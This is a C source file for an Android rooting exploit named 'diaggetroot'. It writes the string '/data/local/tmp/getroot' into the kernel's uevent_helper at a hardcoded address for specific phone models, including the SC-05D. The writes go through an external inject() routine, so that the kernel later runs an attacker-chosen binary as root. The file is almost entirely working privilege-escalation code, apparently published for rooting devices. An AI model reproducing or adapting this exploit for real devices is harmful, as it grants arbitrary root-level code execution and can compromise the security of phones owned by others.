/*
 * Copyright (c) 2013 Hiroyuki Ikezoe
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
/*
 * Based on htcj_butterflay_diaggetroot.zip
 * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <jni.h>
#include <sys/mman.h>

#define  LOG_TAG    "diaggetroot"
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

#include <android/log.h>

//unsigned address = 0xc0d0dfd0; //htc batterfly
//#define UEVENT_HELPER_ADDRESS 0xc0b6cc38; // Xperia SX 113
#define UEVENT_HELPER_ADDRESS 0xc0c90fac; // SC-05D SC05DOMLPL

struct values {
  unsigned addr;
  unsigned short value;
};

extern int inject(void *adr, int value, int fd);

static int
cmpare(const void *a , const void *b) {
  const struct values *x = a;
  const struct values *y = b;
  if (x->value < y->value) {
    return -1;
  }
  if (x->value == y->value) {
    return 0;
  }
  return 1;
}

static void
uevent_helper_mod(int fd)
{
  unsigned address = UEVENT_HELPER_ADDRESS;
  const char path[]="/data/local/tmp/getroot";
  struct values data[400];
  int i, data_length;

  for (i = 0, data_length = 0; i < sizeof(path); i += 2) {
    data[data_length].addr = address + i;
    data[data_length].value = path[i] | (path[i + 1] << 8);
    data_length++;
  }

  qsort(data, data_length, sizeof(struct values), cmpare);

  for (i = 0; i < data_length; i++) {
    LOGD("data[%d] addr=%x value=%x (%c%c)",
         i, data[i].addr, data[i].value,
         data[i].value & 0xff, data[i].value >> 8);
    inject((void*)data[i].addr, data[i].value, fd);
  }
}

void
Java_com_example_diaggetroot_MainActivity_getrootnative(JNIEnv *env,
                                                        jobject thiz,
                                                        int fd)
{
  uevent_helper_mod(fd);
}

int
main (int argc, char **argv)
{
  uevent_helper_mod(0);
  return 0;
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
